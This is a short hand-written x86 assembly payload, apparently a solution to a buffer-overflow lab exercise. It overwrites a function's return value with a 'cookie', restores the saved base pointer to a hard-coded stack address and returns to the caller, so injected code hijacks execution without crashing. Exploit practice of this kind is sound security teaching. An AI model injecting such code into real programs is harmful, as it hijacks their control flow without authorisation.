#assembly written by hand to generate machine instructions
movl $0x7aebe9d2, %eax #move cookie to return value instead of 1
movl $0x55685ff0, %ebp #return ebp to its original value
push $0x08048e10       #return to the caller function
ret
